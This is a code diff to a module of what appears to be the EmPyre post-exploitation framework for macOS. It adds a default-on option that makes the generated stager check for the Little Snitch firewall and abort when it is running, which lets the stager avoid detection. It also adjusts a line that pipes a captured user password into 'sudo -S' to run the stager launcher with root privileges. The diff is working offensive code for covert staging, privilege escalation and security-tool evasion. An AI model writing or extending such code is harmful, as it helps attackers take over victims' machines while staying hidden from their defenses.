@@ -50,6 +50,11 @@ class Module:
                 'Description'   :   'Listener to use.',
                 'Required'      :   True,
                 'Value'         :   ''
+            },
+            'LittleSnitch' : {
+                'Description'   :   'Switch. Check for the LittleSnitch process, exit the staging process if it is running. Defaults to True.',
+                'Required'      :   True,
+                'Value'         :   'True'
             },           
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
@@ -90,6 +95,7 @@ class Module:
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
+        LittleSnitch = self.options['LittleSnitch']['Value']
 
         isEmpire = self.mainMenu.listeners.is_listener_empyre(listenerName)
         if not isEmpire:
@@ -97,7 +103,7 @@ class Module:
             return ""
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds,littlesnitch=LittleSnitch)
 
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
@@ -110,6 +116,6 @@ class Module:
             launcher = launcher.replace('echo', '')
             parts = launcher.split("|")
             launcher = "python -c %s" % (parts[0])
-            script = 'os.system("echo \\"%s\\" | sudo -S %s")' % (password, launcher)
+            script = 'import os; os.system("echo \\"%s\\" | sudo -S %s")' % (password, launcher)
 
             return script
